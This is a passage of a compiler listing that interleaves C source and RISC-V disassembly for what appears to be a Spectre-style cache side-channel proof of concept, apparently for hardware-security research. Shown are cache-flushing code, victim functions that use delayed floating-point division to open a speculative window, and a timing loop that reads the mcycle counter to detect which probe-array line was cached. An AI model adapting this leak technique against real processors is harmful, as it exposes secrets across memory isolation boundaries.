        uint32_t setOffset = (((memAddr & SET_MASK) >> L1_DCACHE_BLOCK_BITS) + i) << L1_DCACHE_BLOCK_BITS;
    1f98:	fcc42783          	lw	a5,-52(s0)
    1f9c:	0037d793          	srli	a5,a5,0x3
    1fa0:	0ff7f713          	zext.b	a4,a5
    1fa4:	fe842783          	lw	a5,-24(s0)
    1fa8:	00f707b3          	add	a5,a4,a5
    1fac:	00379793          	slli	a5,a5,0x3
    1fb0:	fcf42e23          	sw	a5,-36(s0)

        // There are N=L1_DCACHE_WAYS in a set to flush. And it needs to be repeated for MULTIPLIER-1 times since we have an extended dummyMem.
        for(uint32_t j = 0; j < ((MULTIPLIER-1)*L1_DCACHE_WAYS); ++j){
    1fb4:	fe042223          	sw	zero,-28(s0)
    1fb8:	03c0006f          	j	1ff4 <flushCache+0xc8>
        //for(uint32_t j = 0; j < L1_DCACHE_WAYS; ++j){
            // offset to reaccess the set
            uint32_t wayOffset = j << (L1_DCACHE_BLOCK_BITS + L1_DCACHE_SETS_BITS);
    1fbc:	fe442783          	lw	a5,-28(s0)
    1fc0:	00b79793          	slli	a5,a5,0xb
    1fc4:	fcf42c23          	sw	a5,-40(s0)

            // The processor will fetch needed (but empty, this property is important) data into the cache
			// as the following expression shows, which, due to same set bits and tags, evicts previous data.
            flush_junk = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    1fc8:	fe042703          	lw	a4,-32(s0)
    1fcc:	fdc42783          	lw	a5,-36(s0)
    1fd0:	00f70733          	add	a4,a4,a5
    1fd4:	fd842783          	lw	a5,-40(s0)
    1fd8:	00f707b3          	add	a5,a4,a5
    1fdc:	0007c703          	lbu	a4,0(a5) # 1000 <_start>
    1fe0:	800007b7          	lui	a5,0x80000
    1fe4:	38e78423          	sb	a4,904(a5) # 80000388 <flush_junk>
        for(uint32_t j = 0; j < ((MULTIPLIER-1)*L1_DCACHE_WAYS); ++j){
    1fe8:	fe442783          	lw	a5,-28(s0)
    1fec:	00178793          	addi	a5,a5,1
    1ff0:	fef42223          	sw	a5,-28(s0)
    1ff4:	fe442703          	lw	a4,-28(s0)
    1ff8:	00700793          	li	a5,7
    1ffc:	fce7f0e3          	bgeu	a5,a4,1fbc <flushCache+0x90>
    for (uint32_t i = 0; i < numSetsClear; ++i){
    2000:	fe842783          	lw	a5,-24(s0)
    2004:	00178793          	addi	a5,a5,1
    2008:	fef42423          	sw	a5,-24(s0)
    200c:	fe842703          	lw	a4,-24(s0)
    2010:	fec42783          	lw	a5,-20(s0)
    2014:	f8f762e3          	bltu	a4,a5,1f98 <flushCache+0x6c>
			// * indirection or dereferencing operator accesses the object the pointer points to.
        }
    }
}
    2018:	00000013          	nop
    201c:	00000013          	nop
    2020:	03c12403          	lw	s0,60(sp)
    2024:	04010113          	addi	sp,sp,64
    2028:	00008067          	ret

0000202c <victimFuncInit>:
uint32_t tempArray[ARRAY_SIZE_FACTOR];
uint32_t tempArrayIndex = 1;
uint32_t tempArrayIndexInit = 2;

void victimFuncInit(uint32_t targetIdx)
{
    202c:	fe010113          	addi	sp,sp,-32
    2030:	00812e23          	sw	s0,28(sp)
    2034:	02010413          	addi	s0,sp,32
    2038:	fea42623          	sw	a0,-20(s0)
/* Use a different index of tempArray to avoid effect of initial instruction cache miss.
 * Basically the form is kept the same as succeeding formal victimFunc since it is expected to simulate real scenes
 * where attacker has no access to valid address like targetIdx.
 */
	tempArray[2] = targetIdx;
    203c:	800067b7          	lui	a5,0x80006
    2040:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2044:	fec42703          	lw	a4,-20(s0)
    2048:	00e7a423          	sw	a4,8(a5)
    tempArrayIndexInit = tempArrayIndexInit << 4;
    204c:	800007b7          	lui	a5,0x80000
    2050:	3987a783          	lw	a5,920(a5) # 80000398 <tempArrayIndexInit>
    2054:	00479713          	slli	a4,a5,0x4
    2058:	800007b7          	lui	a5,0x80000
    205c:	38e7ac23          	sw	a4,920(a5) # 80000398 <tempArrayIndexInit>
    asm("fcvt.s.wu fa4, %[in]\n"
    2060:	800007b7          	lui	a5,0x80000
    2064:	3987a783          	lw	a5,920(a5) # 80000398 <tempArrayIndexInit>
    2068:	80000737          	lui	a4,0x80000
    206c:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2070:	d0177753          	fcvt.s.wu	fa4,a4
    2074:	d017f7d3          	fcvt.s.wu	fa5,a5
    2078:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    207c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2080:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2084:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2088:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    208c:	800007b7          	lui	a5,0x80000
    2090:	38e7ac23          	sw	a4,920(a5) # 80000398 <tempArrayIndexInit>
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.wu.s %[out], fa5, rtz\n"
        : [out] "=r" (tempArrayIndexInit)
        : [inout] "r" (tempArrayIndexInit), [in] "r" (shift_base)
        : "fa4", "fa5");
    tempArray[tempArrayIndexInit] = 0;
    2094:	800007b7          	lui	a5,0x80000
    2098:	3987a783          	lw	a5,920(a5) # 80000398 <tempArrayIndexInit>
    209c:	80006737          	lui	a4,0x80006
    20a0:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    20a4:	00279793          	slli	a5,a5,0x2
    20a8:	00f707b3          	add	a5,a4,a5
    20ac:	0007a023          	sw	zero,0(a5)
	anchorVar &= probeArray[guideArray[tempArray[2]] * ARRAY_STRIDE];
    20b0:	800067b7          	lui	a5,0x80006
    20b4:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    20b8:	0087a783          	lw	a5,8(a5)
    20bc:	80005737          	lui	a4,0x80005
    20c0:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    20c4:	00f707b3          	add	a5,a4,a5
    20c8:	0007c783          	lbu	a5,0(a5)
    20cc:	00379793          	slli	a5,a5,0x3
    20d0:	80005737          	lui	a4,0x80005
    20d4:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    20d8:	00f707b3          	add	a5,a4,a5
    20dc:	0007c703          	lbu	a4,0(a5)
    20e0:	800007b7          	lui	a5,0x80000
    20e4:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    20e8:	00f777b3          	and	a5,a4,a5
    20ec:	0ff7f713          	zext.b	a4,a5
    20f0:	800007b7          	lui	a5,0x80000
    20f4:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    20f8:	00000013          	nop
    20fc:	01c12403          	lw	s0,28(sp)
    2100:	02010113          	addi	sp,sp,32
    2104:	00008067          	ret

00002108 <victimFunc_00>:

void victimFunc_00(uint32_t targetIdx){
    2108:	fe010113          	addi	sp,sp,-32
    210c:	00812e23          	sw	s0,28(sp)
    2110:	02010413          	addi	s0,sp,32
    2114:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    2118:	800067b7          	lui	a5,0x80006
    211c:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2120:	fec42703          	lw	a4,-20(s0)
    2124:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    2128:	800007b7          	lui	a5,0x80000
    212c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2130:	00479713          	slli	a4,a5,0x4
    2134:	800007b7          	lui	a5,0x80000
    2138:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    213c:	800007b7          	lui	a5,0x80000
    2140:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2144:	80000737          	lui	a4,0x80000
    2148:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    214c:	d0177753          	fcvt.s.wu	fa4,a4
    2150:	d017f7d3          	fcvt.s.wu	fa5,a5
    2154:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2158:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    215c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2160:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2164:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2168:	800007b7          	lui	a5,0x80000
    216c:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2170:	800007b7          	lui	a5,0x80000
    2174:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2178:	80006737          	lui	a4,0x80006
    217c:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    2180:	00279793          	slli	a5,a5,0x2
    2184:	00f707b3          	add	a5,a4,a5
    2188:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    218c:	800067b7          	lui	a5,0x80006
    2190:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2194:	0047a783          	lw	a5,4(a5)
    2198:	80005737          	lui	a4,0x80005
    219c:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    21a0:	00f707b3          	add	a5,a4,a5
    21a4:	0007c783          	lbu	a5,0(a5)
    21a8:	00379793          	slli	a5,a5,0x3
    21ac:	80005737          	lui	a4,0x80005
    21b0:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    21b4:	00f707b3          	add	a5,a4,a5
    21b8:	0007c703          	lbu	a4,0(a5)
    21bc:	800007b7          	lui	a5,0x80000
    21c0:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    21c4:	00f777b3          	and	a5,a4,a5
    21c8:	0ff7f713          	zext.b	a4,a5
    21cc:	800007b7          	lui	a5,0x80000
    21d0:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    21d4:	00000013          	nop
    21d8:	01c12403          	lw	s0,28(sp)
    21dc:	02010113          	addi	sp,sp,32
    21e0:	00008067          	ret

000021e4 <victimFunc_01>:

void victimFunc_01(uint32_t targetIdx){
    21e4:	fe010113          	addi	sp,sp,-32
    21e8:	00812e23          	sw	s0,28(sp)
    21ec:	02010413          	addi	s0,sp,32
    21f0:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    21f4:	800067b7          	lui	a5,0x80006
    21f8:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    21fc:	fec42703          	lw	a4,-20(s0)
    2200:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    2204:	800007b7          	lui	a5,0x80000
    2208:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    220c:	00479713          	slli	a4,a5,0x4
    2210:	800007b7          	lui	a5,0x80000
    2214:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    2218:	800007b7          	lui	a5,0x80000
    221c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2220:	80000737          	lui	a4,0x80000
    2224:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2228:	d0177753          	fcvt.s.wu	fa4,a4
    222c:	d017f7d3          	fcvt.s.wu	fa5,a5
    2230:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2234:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2238:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    223c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2240:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2244:	800007b7          	lui	a5,0x80000
    2248:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    224c:	800007b7          	lui	a5,0x80000
    2250:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2254:	80006737          	lui	a4,0x80006
    2258:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    225c:	00279793          	slli	a5,a5,0x2
    2260:	00f707b3          	add	a5,a4,a5
    2264:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2268:	800067b7          	lui	a5,0x80006
    226c:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2270:	0047a783          	lw	a5,4(a5)
    2274:	80005737          	lui	a4,0x80005
    2278:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    227c:	00f707b3          	add	a5,a4,a5
    2280:	0007c783          	lbu	a5,0(a5)
    2284:	00379793          	slli	a5,a5,0x3
    2288:	80005737          	lui	a4,0x80005
    228c:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    2290:	00f707b3          	add	a5,a4,a5
    2294:	0007c703          	lbu	a4,0(a5)
    2298:	800007b7          	lui	a5,0x80000
    229c:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    22a0:	00f777b3          	and	a5,a4,a5
    22a4:	0ff7f713          	zext.b	a4,a5
    22a8:	800007b7          	lui	a5,0x80000
    22ac:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    22b0:	00000013          	nop
    22b4:	01c12403          	lw	s0,28(sp)
    22b8:	02010113          	addi	sp,sp,32
    22bc:	00008067          	ret

000022c0 <victimFunc_02>:

void victimFunc_02(uint32_t targetIdx){
    22c0:	fe010113          	addi	sp,sp,-32
    22c4:	00812e23          	sw	s0,28(sp)
    22c8:	02010413          	addi	s0,sp,32
    22cc:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    22d0:	800067b7          	lui	a5,0x80006
    22d4:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    22d8:	fec42703          	lw	a4,-20(s0)
    22dc:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    22e0:	800007b7          	lui	a5,0x80000
    22e4:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    22e8:	00479713          	slli	a4,a5,0x4
    22ec:	800007b7          	lui	a5,0x80000
    22f0:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    22f4:	800007b7          	lui	a5,0x80000
    22f8:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    22fc:	80000737          	lui	a4,0x80000
    2300:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2304:	d0177753          	fcvt.s.wu	fa4,a4
    2308:	d017f7d3          	fcvt.s.wu	fa5,a5
    230c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2310:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2314:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2318:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    231c:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2320:	800007b7          	lui	a5,0x80000
    2324:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2328:	800007b7          	lui	a5,0x80000
    232c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2330:	80006737          	lui	a4,0x80006
    2334:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    2338:	00279793          	slli	a5,a5,0x2
    233c:	00f707b3          	add	a5,a4,a5
    2340:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2344:	800067b7          	lui	a5,0x80006
    2348:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    234c:	0047a783          	lw	a5,4(a5)
    2350:	80005737          	lui	a4,0x80005
    2354:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    2358:	00f707b3          	add	a5,a4,a5
    235c:	0007c783          	lbu	a5,0(a5)
    2360:	00379793          	slli	a5,a5,0x3
    2364:	80005737          	lui	a4,0x80005
    2368:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    236c:	00f707b3          	add	a5,a4,a5
    2370:	0007c703          	lbu	a4,0(a5)
    2374:	800007b7          	lui	a5,0x80000
    2378:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    237c:	00f777b3          	and	a5,a4,a5
    2380:	0ff7f713          	zext.b	a4,a5
    2384:	800007b7          	lui	a5,0x80000
    2388:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    238c:	00000013          	nop
    2390:	01c12403          	lw	s0,28(sp)
    2394:	02010113          	addi	sp,sp,32
    2398:	00008067          	ret

0000239c <victimFunc_03>:

void victimFunc_03(uint32_t targetIdx){
    239c:	fe010113          	addi	sp,sp,-32
    23a0:	00812e23          	sw	s0,28(sp)
    23a4:	02010413          	addi	s0,sp,32
    23a8:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    23ac:	800067b7          	lui	a5,0x80006
    23b0:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    23b4:	fec42703          	lw	a4,-20(s0)
    23b8:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    23bc:	800007b7          	lui	a5,0x80000
    23c0:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    23c4:	00479713          	slli	a4,a5,0x4
    23c8:	800007b7          	lui	a5,0x80000
    23cc:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    23d0:	800007b7          	lui	a5,0x80000
    23d4:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    23d8:	80000737          	lui	a4,0x80000
    23dc:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    23e0:	d0177753          	fcvt.s.wu	fa4,a4
    23e4:	d017f7d3          	fcvt.s.wu	fa5,a5
    23e8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23ec:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23f0:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23f4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23f8:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    23fc:	800007b7          	lui	a5,0x80000
    2400:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2404:	800007b7          	lui	a5,0x80000
    2408:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    240c:	80006737          	lui	a4,0x80006
    2410:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    2414:	00279793          	slli	a5,a5,0x2
    2418:	00f707b3          	add	a5,a4,a5
    241c:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2420:	800067b7          	lui	a5,0x80006
    2424:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2428:	0047a783          	lw	a5,4(a5)
    242c:	80005737          	lui	a4,0x80005
    2430:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    2434:	00f707b3          	add	a5,a4,a5
    2438:	0007c783          	lbu	a5,0(a5)
    243c:	00379793          	slli	a5,a5,0x3
    2440:	80005737          	lui	a4,0x80005
    2444:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    2448:	00f707b3          	add	a5,a4,a5
    244c:	0007c703          	lbu	a4,0(a5)
    2450:	800007b7          	lui	a5,0x80000
    2454:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    2458:	00f777b3          	and	a5,a4,a5
    245c:	0ff7f713          	zext.b	a4,a5
    2460:	800007b7          	lui	a5,0x80000
    2464:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2468:	00000013          	nop
    246c:	01c12403          	lw	s0,28(sp)
    2470:	02010113          	addi	sp,sp,32
    2474:	00008067          	ret

00002478 <victimFunc_04>:

void victimFunc_04(uint32_t targetIdx){
    2478:	fe010113          	addi	sp,sp,-32
    247c:	00812e23          	sw	s0,28(sp)
    2480:	02010413          	addi	s0,sp,32
    2484:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    2488:	800067b7          	lui	a5,0x80006
    248c:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2490:	fec42703          	lw	a4,-20(s0)
    2494:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    2498:	800007b7          	lui	a5,0x80000
    249c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24a0:	00479713          	slli	a4,a5,0x4
    24a4:	800007b7          	lui	a5,0x80000
    24a8:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    24ac:	800007b7          	lui	a5,0x80000
    24b0:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24b4:	80000737          	lui	a4,0x80000
    24b8:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    24bc:	d0177753          	fcvt.s.wu	fa4,a4
    24c0:	d017f7d3          	fcvt.s.wu	fa5,a5
    24c4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24c8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24cc:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24d0:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24d4:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    24d8:	800007b7          	lui	a5,0x80000
    24dc:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    24e0:	800007b7          	lui	a5,0x80000
    24e4:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24e8:	80006737          	lui	a4,0x80006
    24ec:	c9c70713          	addi	a4,a4,-868 # 80005c9c <tempArray>
    24f0:	00279793          	slli	a5,a5,0x2
    24f4:	00f707b3          	add	a5,a4,a5
    24f8:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    24fc:	800067b7          	lui	a5,0x80006
    2500:	c9c78793          	addi	a5,a5,-868 # 80005c9c <tempArray>
    2504:	0047a783          	lw	a5,4(a5)
    2508:	80005737          	lui	a4,0x80005
    250c:	39c70713          	addi	a4,a4,924 # 8000539c <guideArray>
    2510:	00f707b3          	add	a5,a4,a5
    2514:	0007c783          	lbu	a5,0(a5)
    2518:	00379793          	slli	a5,a5,0x3
    251c:	80005737          	lui	a4,0x80005
    2520:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    2524:	00f707b3          	add	a5,a4,a5
    2528:	0007c703          	lbu	a4,0(a5)
    252c:	800007b7          	lui	a5,0x80000
    2530:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    2534:	00f777b3          	and	a5,a4,a5
    2538:	0ff7f713          	zext.b	a4,a5
    253c:	800007b7          	lui	a5,0x80000
    2540:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2544:	00000013          	nop
    2548:	01c12403          	lw	s0,28(sp)
    254c:	02010113          	addi	sp,sp,32
    2550:	00008067          	ret

00002554 <cacheAttack>:

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

void cacheAttack(uint8_t* outIdx, uint32_t* outTimes){
    2554:	fd010113          	addi	sp,sp,-48
    2558:	02812623          	sw	s0,44(sp)
    255c:	02912423          	sw	s1,40(sp)
    2560:	03010413          	addi	s0,sp,48
    2564:	fca42e23          	sw	a0,-36(s0)
    2568:	fcb42c23          	sw	a1,-40(s0)

	register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
	// Read out probeArray and see the hit secret value.
	/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
    256c:	fe042623          	sw	zero,-20(s0)
    2570:	0c00006f          	j	2630 <cacheAttack+0xdc>
		mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
    2574:	fec42703          	lw	a4,-20(s0)
    2578:	00070793          	mv	a5,a4
    257c:	00679793          	slli	a5,a5,0x6
    2580:	00e787b3          	add	a5,a5,a4
    2584:	00178793          	addi	a5,a5,1
    2588:	0ff7f713          	zext.b	a4,a5
    258c:	800067b7          	lui	a5,0x80006
    2590:	48e7ae23          	sw	a4,1180(a5) # 8000649c <mixed_i>
		start = READ_CSR(mcycle);
    2594:	b00027f3          	csrr	a5,mcycle
    2598:	fef42223          	sw	a5,-28(s0)
    259c:	fe442783          	lw	a5,-28(s0)
    25a0:	00078493          	mv	s1,a5
		//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
		dummy &= probeArray[mixed_i * ARRAY_STRIDE];
    25a4:	800067b7          	lui	a5,0x80006
    25a8:	49c7a783          	lw	a5,1180(a5) # 8000649c <mixed_i>
    25ac:	00379793          	slli	a5,a5,0x3
    25b0:	80005737          	lui	a4,0x80005
    25b4:	49c70713          	addi	a4,a4,1180 # 8000549c <probeArray>
    25b8:	00f707b3          	add	a5,a4,a5
    25bc:	0007c783          	lbu	a5,0(a5)
    25c0:	00078713          	mv	a4,a5
    25c4:	800067b7          	lui	a5,0x80006
    25c8:	4a07a783          	lw	a5,1184(a5) # 800064a0 <dummy>
    25cc:	00f77733          	and	a4,a4,a5
    25d0:	800067b7          	lui	a5,0x80006
    25d4:	4ae7a023          	sw	a4,1184(a5) # 800064a0 <dummy>
		diff = (READ_CSR(mcycle) - start);
    25d8:	b00027f3          	csrr	a5,mcycle
    25dc:	fef42023          	sw	a5,-32(s0)
    25e0:	fe042783          	lw	a5,-32(s0)
    25e4:	409784b3          	sub	s1,a5,s1

		// Condition: interval of time is smaller than the threshold.
		if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
    25e8:	02c00793          	li	a5,44
    25ec:	0297ec63          	bltu	a5,s1,2624 <cacheAttack+0xd0>
			results[mixed_i]++; /* Cache hit */
    25f0:	800067b7          	lui	a5,0x80006
    25f4:	49c7a783          	lw	a5,1180(a5) # 8000649c <mixed_i>
    25f8:	80006737          	lui	a4,0x80006
    25fc:	09c70693          	addi	a3,a4,156 # 8000609c <results>
    2600:	00279713          	slli	a4,a5,0x2
    2604:	00e68733          	add	a4,a3,a4
    2608:	00072703          	lw	a4,0(a4)
    260c:	00170713          	addi	a4,a4,1
    2610:	800066b7          	lui	a3,0x80006
    2614:	09c68693          	addi	a3,a3,156 # 8000609c <results>
    2618:	00279793          	slli	a5,a5,0x2
    261c:	00f687b3          	add	a5,a3,a5
    2620:	00e7a023          	sw	a4,0(a5)
	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
    2624:	fec42783          	lw	a5,-20(s0)
    2628:	00178793          	addi	a5,a5,1
    262c:	fef42623          	sw	a5,-20(s0)
    2630:	fec42703          	lw	a4,-20(s0)
    2634:	0ff00793          	li	a5,255
    2638:	f2e7dee3          	bge	a5,a4,2574 <cacheAttack+0x20>
		}
	}
	/* Use junk so above 'dummy=' row won't get optimized out. Order of the following instructions seems to be in a fixed position. */
	/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
	/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
	results[0] ^= dummy;
    263c:	800067b7          	lui	a5,0x80006
    2640:	09c78793          	addi	a5,a5,156 # 8000609c <results>
    2644:	0007a703          	lw	a4,0(a5)
    2648:	800067b7          	lui	a5,0x80006
    264c:	4a07a783          	lw	a5,1184(a5) # 800064a0 <dummy>
    2650:	00f74733          	xor	a4,a4,a5
    2654:	800067b7          	lui	a5,0x80006
    2658:	09c78793          	addi	a5,a5,156 # 8000609c <results>
    265c:	00e7a023          	sw	a4,0(a5)

	outIdx[0] = 0;
    2660:	fdc42783          	lw	a5,-36(s0)
    2664:	00078023          	sb	zero,0(a5)
	outTimes[0] = 0;
    2668:	fd842783          	lw	a5,-40(s0)
    266c:	0007a023          	sw	zero,0(a5)

	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
    2670:	fe042423          	sw	zero,-24(s0)
    2674:	0640006f          	j	26d8 <cacheAttack+0x184>
		if (results[i] > outTimes[0]){
    2678:	800067b7          	lui	a5,0x80006
    267c:	09c78713          	addi	a4,a5,156 # 8000609c <results>
    2680:	fe842783          	lw	a5,-24(s0)
    2684:	00279793          	slli	a5,a5,0x2
    2688:	00f707b3          	add	a5,a4,a5
